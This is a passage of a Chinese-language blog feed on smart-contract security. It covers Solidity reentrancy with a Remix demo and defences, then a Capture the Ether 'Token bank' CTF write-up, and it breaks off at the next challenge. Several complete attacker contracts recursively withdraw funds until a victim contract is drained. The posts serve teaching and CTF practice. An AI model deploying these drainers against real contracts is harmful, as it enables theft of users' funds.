class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  EtherStore public etherStore;//这里需要传入被攻击的合约</span><br><span class="line"></span><br><span class="line">  // 这里的地址就是 EtherStore 的地址</span><br><span class="line">  constructor(address _etherStoreAddress) &#123;</span><br><span class="line">      etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      require(msg.value &gt;= 1 ether);//至少存1ETH来获得取钱的权限</span><br><span class="line">      etherStore.depositFunds.value(1 ether)();//存1ETH</span><br><span class="line">      // 1. 调用取款函数，取回1个 ETH</span><br><span class="line">      etherStore.withdrawFunds(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 3. EtherStore 完成转账后，自动调用 fallback，执行其中逻辑。</span><br><span class="line">  function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">        // 4. 继续调用取款函数，取回1个 ETH</span><br><span class="line">          etherStore.withdrawFunds(1 ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remix复现"><a href="#Remix复现" class="headerlink" title="Remix复现"></a>Remix复现</h2><p>（1）部署EtherBank.sol合约</p><p>（2）一般用户进行存钱</p><p><img src="https://moe.photo/images/2023/02/22/1.png" alt></p><p>（3）查看余额</p><p><img src="https://moe.photo/images/2023/02/22/2.jpg" alt></p><p><img src="https://moe.photo/images/2023/02/22/3.png" alt></p><p>（4）部署攻击合约</p><p><img src="https://moe.photo/images/2023/02/22/4.png" alt></p><p>（5）发起攻击</p><p><img src="https://moe.photo/images/2023/02/22/5.png" alt></p><p>（6）攻击成功</p><p><img src="https://moe.photo/images/2023/02/22/6.png" alt></p><p><strong>受害者：EtherBank.sol</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;//使用openzeppelin的modifier可防止重入</span><br><span class="line">import &quot;hardhat/console.sol&quot;;//为了在控制台打印输出</span><br><span class="line"></span><br><span class="line">contract EtherBank is ReentrancyGuard &#123;//受害者</span><br><span class="line"></span><br><span class="line">    using Address for address payable;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        console.log(&quot;Begin withdraw&quot;);</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;Withdrawl amount exceeds available balance.&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;&quot;);</span><br><span class="line">        console.log(&quot;EtherBank balance: &quot;, address(this).balance);</span><br><span class="line">        console.log(&quot;Attacker balance: &quot;, balances[msg.sender]);</span><br><span class="line">        console.log(&quot;&quot;);</span><br><span class="line">        //下面两行是问题代码</span><br><span class="line">        payable(msg.sender).sendValue(balances[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0; </span><br><span class="line">        </span><br><span class="line">        console.log(&quot;End withdraw&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>攻击者：Attacker.sol</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;//为了在控制台打印输出</span><br><span class="line"></span><br><span class="line">interface IEtherBank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;//攻击者</span><br><span class="line">    IEtherBank public immutable etherBank;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    constructor(address etherBankAddress) &#123;</span><br><span class="line">        etherBank = IEtherBank(etherBankAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable onlyOwner &#123;</span><br><span class="line">        etherBank.deposit&#123;value: msg.value&#125;();//调用attack的时候，先存一点钱，满足取款条件</span><br><span class="line">        etherBank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        console.log(&quot;receive...&quot;);</span><br><span class="line">        </span><br><span class="line">        if (address(etherBank).balance &gt; 0) &#123;//只有取完EtherBank中的钱才停止重入</span><br><span class="line">            console.log(&quot;reentering...&quot;);</span><br><span class="line">            etherBank.withdraw();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(&quot;victim account drained&quot;);</span><br><span class="line">            payable(owner).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function getBalance() external view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(owner == msg.sender, &quot;Only the owner can attack.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h2><p>2016 年 6 月 17 日，TheDAO 项目遭到了重入攻击，导致了 300 多万个以太币被从 TheDAO 资产池中分离出来，而攻击者利用 TheDAO 智能合约中的 splitDAO() 函数重复利用自己的 DAO 资产进行重入攻击，不断的从 TheDAO 项目的资产池中将 DAO 资产分离出来并转移到自己的账户中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//Burn DAO Tokens</span><br><span class="line">Transfer(msg.sender,0,balances[msg.sender]);</span><br><span class="line">withdrawRewardFor(msg.sender);</span><br><span class="line">totalSupply -= balances[msg.sender];//更新状态变量在转账操作之后</span><br><span class="line">balances[msg.sender] = 0;</span><br><span class="line">paidOut[msg.sender] = 0;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><ul><li><p>最简单的方式：使用更加安全的transfer、send代替call进行转账</p></li><li><p>先赋值后转账：对withdraw 函数做如下更改</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    </span><br><span class="line">    //这里改为先赋值，再转账，等于重入第二次的时候，攻击者账目上钱就是减少后的。</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    require(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>利用共有变量进行限制</li></ul><p>这个的原理是记录调用者的进出记录，检查有没有完整的执行函数逻辑。如果攻击者只有进记录，没有出记录，那么很有可能是在进行重入攻击。Openzeppelin使用的这个方法来防止重入攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = 1;</span><br><span class="line">    uint256 private constant _ENTERED = 2;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);</span><br><span class="line">        _status = _ENTERED;//设置状态为已经进入，重入require就会判断失败。成功防止了重入</span><br><span class="line">        _;</span><br><span class="line">        _status = _NOT_ENTERED;//设置状态为未进入。用户可再次调用方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更加清晰的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool reEntrancecyMutex = false;</span><br><span class="line">function withdraw(uint256 amount) public&#123;</span><br><span class="line">    require(!reEntrancecyMutex);</span><br><span class="line">    reEntrancecyMutex = true;//上锁</span><br><span class="line">    require(balances[msg.sender] &gt;= amount);</span><br><span class="line">    require(this.balance &gt;= amount);</span><br><span class="line">    if(msg.sender.call.value(amout)())&#123;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    reEntrancecyMutex = false;//解锁</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>禁止转账 Ether 到合约地址：因为合约可以通过回调函数来进行重入，禁止转账到合约地址，可以防止转账导致的合约重入。这里使用到了内联汇编</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function withdraw() nonReentrant external &#123;</span><br><span class="line">    require(balance[msg.sender] &gt; 0, &quot;Bank: no balance&quot;);</span><br><span class="line">    uint256 size;</span><br><span class="line">    address sender = msg.sender;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        size := extcodesize(sender)//extcodesize(sender):地址sender的代码大小</span><br><span class="line">    &#125;</span><br><span class="line">    //需要地址代码大小为0，说明地址肯定就不是合约，只能是用户</span><br><span class="line">    require(size == 0, &quot;Bank: cannot transfer to contract&quot;);</span><br><span class="line">    msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">    totalDeposit -= balance[msg.sender];</span><br><span class="line">    balance[msg.sender] = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>使用代码审计工具：<a href="https://github.com/wangbar0133/Asuka。">https://github.com/wangbar0133/Asuka。</a></li></ul><p>这是使用纯python编写的solidity代码审计工具，不需要安装solc等其他环境，可一键安装。如图是BEC整数溢出漏洞检测出来的结果</p><p><img src="https://moe.photo/images/2023/02/22/6e0dcdb33de208d048ec4c73541c4ca8.png" alt></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>跨用户重入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mapping(address=&gt;uint) private userBalances;</span><br><span class="line"></span><br><span class="line">function transfer(address to,uint amount)&#123;</span><br><span class="line">if(userBalances[msg.sender] &gt;= amount)&#123;</span><br><span class="line">userBalances[to] += amount;</span><br><span class="line">userBalances[msg.sender] -= amount;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawBalance() public&#123;</span><br><span class="line">uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">(bool success,_) = msg.sender.call.value(amountToWithdraw);</span><br><span class="line">require(success);</span><br><span class="line">userBalances[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约在收到eth的时候会触发receive或者fallback方法。用户调用withdraw提取之后，触发了这个方法，但是存储代币的那个目标合约里的userbalance此时还没归0，触发的receive或者fallback又调用了transfer方法向别的人进行转账。即：fallback或者receive中包含了withdraw和transfer方法</p><p>这会导致，黑客A重入，然后黑客A又把权益给了黑客B，黑客B拥有黑客A在合约中的钱。这时黑客B又可以进行重入……</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.Account Takeover</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/17.Token%20bank/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/17.Token%20bank/</url>
      
        <content type="html"><![CDATA[<h1 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    // Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            //retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        // Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        // the token contract&#x27;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] = 500000 * 10**18;  // half for me</span><br><span class="line">        balanceOf[player] = 500000 * 10**18;      // half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>本题是有关ERC20的重入问题，可以看到如下有问题的代码：</p><p>先转钱，再修改变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">    require(token.transfer(msg.sender, amount));</span><br><span class="line">    balanceOf[msg.sender] -= amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦转钱，此ERC20的transfer()就会去执行外部合约实现的<code>tokenFallback()</code>方法，也就是模拟<code>fallback()</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">    balanceOf[msg.sender] -= value;</span><br><span class="line">    balanceOf[to] += value;</span><br><span class="line">    emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">    if (isContract(to)) &#123;</span><br><span class="line">        ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>情况很明了，就是写一个重入攻击的合约，实现恶意的<code>tokenFallback()</code>方法，不断重入地调用取钱函数</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance = 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr,address _ISimpleERC223Token) public &#123;</span><br><span class="line">        challenge = ITokenBankChallenge(_addr);</span><br><span class="line">        token = ISimpleERC223Token(_ISimpleERC223Token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">        token.transfer(challenge, balance);</span><br><span class="line">        challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) public &#123;</span><br><span class="line">        token.balanceOf(from); </span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        uint256 challengeLeftBalance = token.balanceOf(address(challenge));</span><br><span class="line">        bool keepRecursing = challengeLeftBalance &gt; 0;</span><br><span class="line">        if (keepRecursing) &#123;</span><br><span class="line">        uint256 v = value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">        challenge.withdraw(v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.Assume ownership</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/16.Assume%20ownership/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/16.Assume%20ownership/</url>
      
        <content type="html"><![CDATA[<h1 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses-amp-solutions"><a 